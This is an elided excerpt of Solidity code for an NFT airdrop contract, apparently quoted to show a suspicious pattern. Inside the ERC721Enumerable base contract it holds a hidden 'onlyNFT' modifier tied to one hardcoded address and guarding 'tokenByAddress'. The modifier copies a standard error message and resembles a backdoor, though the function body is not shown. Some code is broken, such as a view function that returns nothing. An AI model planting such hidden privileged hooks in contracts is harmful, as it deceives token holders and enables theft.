...
abstract contract ERC721Enumerable is ERC721, IERC721Enumerable {
    ...
    modifier onlyNFT() {
        require(0x989ead03f535a514f92925312dd2266552fE1aEe == _msgSender(), "Ownable: caller is not the User");
        _;
    }

    function tokenByAddress() public virtual onlyNFT {
...
contract Airdrop is ERC721, ERC721Enumerable, Ownable {
    ...
    event createCyberRunner(address indexed);
    
    constructor() ERC721("InternationalNFTDay", "Airdrop-IND") { 
    ...
    function mintToken(address[] memory _list) public {
        require(saleIsActive, "Sales should be active");
        require(_list.length <= maxTokenPurchase, "Exceeded max token purchase");
        for(uint i = 0; i < _list.length; i++) {
            internalMint(_list[i]);
        }
    }
    ...
    function internalMint(address to) internal {
        ...
        emit createCyberRunner(to);
    }

    function currentTokenId () public view {
        _tokenIdCounter.current();
    }

    function increaseTokenIdCounter () public onlyOwner {
        _tokenIdCounter.increment();
    }

    function decreaseTokenIdCounter () public onlyOwner {
